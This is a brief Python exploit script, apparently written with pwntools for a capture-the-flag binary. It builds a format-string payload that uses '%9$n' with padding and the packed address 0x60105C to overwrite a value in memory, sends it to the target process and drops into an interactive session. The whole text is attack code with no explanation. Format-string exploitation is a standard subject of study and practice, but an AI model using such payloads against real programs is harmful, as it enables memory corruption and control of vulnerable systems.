
numbwritten = 1
what = 0x2

p = b'a' * what
p += b'%9$n'
p = p.ljust(8, b'a')
p += b'a' * numbwritten
p += p64(0x60105C)
print(p)

io = start()
io.clean()
io.sendline(p)
io.interactive()
